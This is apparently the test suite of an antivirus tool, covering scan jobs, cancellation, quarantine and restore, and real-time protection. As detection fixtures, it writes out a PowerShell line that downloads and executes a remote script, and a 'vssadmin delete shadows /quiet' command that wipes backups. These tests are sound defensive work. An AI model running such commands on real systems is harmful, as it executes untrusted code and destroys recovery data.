"""Scan jobs, quarantine and real-time protection."""

from __future__ import annotations

import shutil
import time
from pathlib import Path

import pytest

from guardiantus.core.models import ScanState, ScanType, Verdict
from guardiantus.core.quarantine import QuarantineError, get_quarantine
from guardiantus.core.realtime import RealtimeProtection
from guardiantus.core.scanner import FileScanner, ScanJob, count_files, iter_files

# -------------------------------------------------------------- walking


def test_iter_files_finds_everything(samples):
    found = {p.name for p in iter_files([samples])}
    assert "clean.txt" in found
    assert "eicar.com" in found


def test_iter_files_prunes_noise(tmp_path):
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "app.py").write_text("print('hi')")
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "junk.js").write_text("x")
    found = {p.name for p in iter_files([tmp_path])}
    assert "app.py" in found
    assert "junk.js" not in found


def test_count_files_respects_limit(samples):
    assert count_files([samples], limit=2) == 2


# ------------------------------------------------------------- scan jobs


def test_scan_job_finds_every_threat(samples):
    job = ScanJob(targets=[samples], scan_type=ScanType.CUSTOM)
    job.run()
    assert job.progress.state is ScanState.COMPLETED
    assert job.progress.files_scanned == 6
    assert job.progress.threats_found >= 4
    assert job.progress.percent == 100.0
    names = {t.primary_name for t in job.threats}
    assert "EICAR-Test-File" in names


def test_scan_job_records_history(samples, app):
    job = ScanJob(targets=[samples], scan_type=ScanType.CUSTOM, db=app.db)
    job.run()
    history = app.db.recent_scans()
    assert history[0]["scan_id"] == job.scan_id
    assert history[0]["state"] == "completed"
    assert app.db.recent_detections(scan_id=job.scan_id)


def test_scan_job_can_be_cancelled(tmp_path):
    for index in range(400):
        (tmp_path / f"file{index}.txt").write_text("content " * 200)
    job = ScanJob(targets=[tmp_path], scan_type=ScanType.CUSTOM).start()
    job.cancel()
    job.join(timeout=30)
    assert job.progress.state is ScanState.CANCELLED
    assert not job.is_running


def test_stopping_a_scan_is_immediate(tmp_path):
    """The stop button must take effect at once, not when the workers drain.

    A scan that still reports itself as running keeps its card on the
    dashboard, which reads as the stop having been ignored.
    """
    for index in range(2000):
        (tmp_path / f"file{index}.txt").write_text("content " * 400)

    job = ScanJob(targets=[tmp_path], scan_type=ScanType.CUSTOM).start()
    for _ in range(200):
        if job.progress.state is ScanState.RUNNING:
            break
        time.sleep(0.02)

    job.cancel()
    assert job.progress.state is ScanState.CANCELLED
    assert not job.is_running
    assert job.progress.finished_at is not None

    job.join(timeout=60)
    assert job.progress.state is ScanState.CANCELLED


def test_stopping_a_scan_survives_the_workers_finishing(tmp_path):
    """Late progress flushes must not put a stopped scan back on the dashboard."""
    for index in range(600):
        (tmp_path / f"file{index}.txt").write_text("content " * 200)

    job = ScanJob(targets=[tmp_path], scan_type=ScanType.CUSTOM).start()
    job.cancel()
    job.join(timeout=60)
    assert job.progress.state is ScanState.CANCELLED
    assert not job.is_running


def test_stopping_interrupts_the_file_walk(tmp_path):
    """Counting the files of a full scan must not outlive the stop button."""
    import threading

    from guardiantus.core.scanner import count_files

    for depth in range(30):
        directory = tmp_path / f"d{depth}"
        directory.mkdir()
        for index in range(200):
            (directory / f"f{index}.txt").write_text("x")

    cancel = threading.Event()
    cancel.set()
    assert count_files([tmp_path], cancel=cancel) == 0
    assert list(iter_files([tmp_path], cancel=cancel)) == []


def test_scan_job_reports_progress(samples):
    seen = []
    job = ScanJob(
        targets=[samples],
        scan_type=ScanType.CUSTOM,
        on_result=lambda result: seen.append(result),
    )
    job.run()
    assert len(seen) == len(job.results)
    assert job.summary()["threats"]


def test_single_threaded_scan_matches_parallel(samples):
    parallel = ScanJob(targets=[samples], scan_type=ScanType.CUSTOM)
    parallel.config.set("scanning", "worker_threads", 4)
    parallel.run()

    serial = ScanJob(targets=[samples], scan_type=ScanType.CUSTOM)
    serial.config.set("scanning", "worker_threads", 1)
    serial.run()

    assert parallel.progress.threats_found == serial.progress.threats_found
    assert parallel.progress.files_scanned == serial.progress.files_scanned


# ------------------------------------------------------------ quarantine


def test_quarantine_removes_and_restores_exactly(samples):
    vault = get_quarantine()
    scanner = FileScanner()
    target = samples / "eicar.com"
    original = target.read_bytes()

    result = scanner.scan_file(target)
    entry = vault.quarantine_file(result)

    assert not target.exists()
    assert entry.threat_name == "EICAR-Test-File"
    assert len(vault.list_entries()) == 1

    restored = vault.restore(entry.entry_id)
    assert restored == target
    assert target.read_bytes() == original
    assert vault.list_entries() == []


def test_restoring_allows_the_file_from_then_on(samples):
    """A restore that the next scan undoes is not a restore."""
    vault = get_quarantine()
    scanner = FileScanner()
    target = samples / "eicar.com"

    entry = vault.quarantine_file(scanner.scan_file(target))
    vault.restore(entry.entry_id)

    assert target.exists()
    assert FileScanner().scan_file(target).verdict is Verdict.CLEAN


def test_restoring_survives_realtime_protection(tmp_path, samples):
    """Real-time protection used to re-quarantine a restored file in seconds."""
    watched = tmp_path / "watched"
    watched.mkdir()
    dropped = watched / "payload.sh"
    dropped.write_text((samples / "shell.sh").read_text())

    vault = get_quarantine()
    entry = vault.quarantine_file(FileScanner().scan_file(dropped))
    assert not dropped.exists()

    protection = RealtimeProtection()
    protection.config.set("realtime", "debounce_seconds", 0.0)
    vault.restore(entry.entry_id)

    protection.scan_now(str(dropped))
    assert dropped.exists(), "the restored file was taken away again"
    assert protection.threats_blocked == 0


def test_restore_can_be_retried_after_a_failed_write(samples, monkeypatch):
    """A failure must leave the entry restorable, not strand it in the vault."""
    vault = get_quarantine()
    target = samples / "eicar.com"
    entry = vault.quarantine_file(FileScanner().scan_file(target))

    def explode(*_args, **_kwargs):
        raise OSError("device is busy")

    monkeypatch.setattr(Path, "write_bytes", explode)
    with pytest.raises(QuarantineError):
        vault.restore(entry.entry_id)
    monkeypatch.undo()

    assert len(vault.list_entries()) == 1, "the entry disappeared after a failed restore"
    assert vault.restore(entry.entry_id) == target
    assert target.exists()


def test_restore_recreates_a_deleted_parent_directory(tmp_path):
    """Temp folders vanish between runs; the file still has to come back."""
    directory = tmp_path / "gone" / "deeper"
    directory.mkdir(parents=True)
    victim = directory / "payload.txt"
    victim.write_text("GUARDIANTUS-AV-SIGNATURE-SELFTEST-FILE-DO-NOT-REMOVE\n")

    vault = get_quarantine()
    entry = vault.quarantine_file(FileScanner().scan_file(victim))
    shutil.rmtree(tmp_path / "gone")

    assert vault.restore(entry.entry_id) == victim
    assert victim.exists()


def test_restore_marks_the_detection_as_restored(samples, app):
    vault = get_quarantine()
    job = ScanJob(targets=[samples], scan_type=ScanType.CUSTOM, db=app.db, auto_quarantine=True)
    job.run()

    entry = next(e for e in vault.list_entries() if e["original_path"].endswith("eicar.com"))
    vault.restore(entry["entry_id"])

    handled = {d["path"]: d["handled"] for d in app.db.recent_detections()}
    assert handled[entry["original_path"]] == "restored"


def test_quarantined_payload_is_not_stored_verbatim(samples):
    vault = get_quarantine()
    result = FileScanner().scan_file(samples / "eicar.com")
    entry = vault.quarantine_file(result)
    stored = (vault.dir / entry.stored_name).read_bytes()
    assert b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE" not in stored


def test_quarantined_file_is_not_rescanned(samples):
    """The vault must be invisible to the scanner, or scans would loop."""
    vault = get_quarantine()
    result = FileScanner().scan_file(samples / "eicar.com")
    entry = vault.quarantine_file(result)
    verdict = FileScanner().scan_file(vault.dir / entry.stored_name)
    assert verdict.verdict is Verdict.SKIPPED


def test_quarantine_delete_is_permanent(samples):
    vault = get_quarantine()
    result = FileScanner().scan_file(samples / "eicar.com")
    entry = vault.quarantine_file(result)

    vault.delete(entry.entry_id)
    assert not (vault.dir / entry.stored_name).exists()
    assert vault.list_entries() == []
    with pytest.raises(QuarantineError):
        vault.restore(entry.entry_id)


def test_quarantine_empty(samples):
    vault = get_quarantine()
    scanner = FileScanner()
    for name in ("eicar.com", "shell.sh", "probe.txt"):
        vault.quarantine_file(scanner.scan_file(samples / name))
    assert vault.stats()["count"] == 3
    assert vault.empty() == 3
    assert vault.stats()["count"] == 0


def test_quarantine_rejects_missing_file(tmp_path):
    from guardiantus.core.models import ScanResult

    vault = get_quarantine()
    ghost = ScanResult(path=str(tmp_path / "gone.bin"), verdict=Verdict.MALICIOUS)
    with pytest.raises(QuarantineError):
        vault.quarantine_file(ghost)


def test_scan_with_auto_quarantine(samples):
    job = ScanJob(targets=[samples], scan_type=ScanType.CUSTOM, auto_quarantine=True)
    job.run()
    assert not (samples / "eicar.com").exists()
    assert (samples / "clean.txt").exists()
    assert all(t.quarantined for t in job.threats)


# -------------------------------------------------------------- realtime


def test_realtime_blocks_a_dropped_file(tmp_path, samples):
    watched = tmp_path / "watched"
    watched.mkdir()

    protection = RealtimeProtection()
    protection.config.set("realtime", "poll_interval_seconds", 0.2)
    protection.config.set("realtime", "debounce_seconds", 0.0)
    protection.start([str(watched)])
    try:
        dropped = watched / "payload.sh"
        dropped.write_text((samples / "shell.sh").read_text())

        for _ in range(80):
            if protection.threats_blocked:
                break
            time.sleep(0.1)

        assert protection.threats_blocked == 1
        assert not dropped.exists()
        assert get_quarantine().list_entries()
    finally:
        protection.stop()


def test_realtime_leaves_clean_files_alone(tmp_path):
    watched = tmp_path / "watched"
    watched.mkdir()

    protection = RealtimeProtection()
    protection.config.set("realtime", "debounce_seconds", 0.0)
    innocent = watched / "notes.txt"
    innocent.write_text("shopping list: bread, milk")

    protection.scan_now(str(innocent))
    assert protection.threats_blocked == 0
    assert innocent.exists()


def test_realtime_report_only_mode(tmp_path, samples):
    watched = tmp_path / "watched"
    watched.mkdir()
    dropped = watched / "payload.sh"
    dropped.write_text((samples / "shell.sh").read_text())

    protection = RealtimeProtection()
    protection.config.set("realtime", "action", "report")
    protection.scan_now(str(dropped))

    assert protection.threats_blocked == 1
    assert dropped.exists(), "report mode must not move the file"


def test_realtime_status_shape():
    protection = RealtimeProtection()
    status = protection.status()
    assert status["running"] is False
    assert status["backend"] == "stopped"
    assert "watchdog_available" in status


def test_realtime_refuses_bad_paths(tmp_path):
    protection = RealtimeProtection()
    with pytest.raises(RuntimeError):
        protection.start([str(tmp_path / "does-not-exist")])


def test_only_confirmed_threats_are_moved(tmp_path):
    """A heuristic guess is reported; it does not silently move the file."""
    script = tmp_path / "installer.ps1"
    script.write_text(
        "$c = New-Object System.Net.WebClient\n"
        "Invoke-Expression $c.DownloadString('http://example.invalid/x.ps1')\n"
    )
    result = FileScanner().scan_file(script)
    assert result.is_threat

    job = ScanJob(targets=[tmp_path], scan_type=ScanType.CUSTOM, auto_quarantine=True)
    job.run()

    suspicious = [t for t in job.threats if t.verdict is Verdict.SUSPICIOUS]
    assert all(not t.quarantined for t in suspicious)
    for threat in suspicious:
        assert Path(threat.path).exists(), "a suspicion should not move a file"


def test_suspicious_files_are_moved_when_asked(tmp_path):
    from guardiantus.config import get_config

    script = tmp_path / "note.txt"
    script.write_text("ALPHA " * 50 + "\nvssadmin delete shadows /quiet\n")
    get_config().set("scanning", "quarantine_suspicious", True)

    job = ScanJob(targets=[tmp_path], scan_type=ScanType.CUSTOM, auto_quarantine=True)
    job.run()
    assert job.progress.threats_found >= 1
    assert all(t.quarantined for t in job.threats)


def test_scan_quarantine_follows_config(samples):
    """A manual scan honours scanning.auto_quarantine, not the realtime action."""
    from guardiantus.config import get_config
    from guardiantus.core.scanner import get_scan_manager

    config = get_config()
    config.set("scanning", "auto_quarantine", False)
    config.set("realtime", "action", "quarantine")

    job = get_scan_manager().start(ScanType.CUSTOM, targets=[samples])
    job.join(timeout=60)
    assert job.progress.threats_found >= 4
    assert (samples / "eicar.com").exists(), "report-only scan must not move files"

    config.set("scanning", "auto_quarantine", True)
    job = get_scan_manager().start(ScanType.CUSTOM, targets=[samples])
    job.join(timeout=60)
    assert not (samples / "eicar.com").exists()
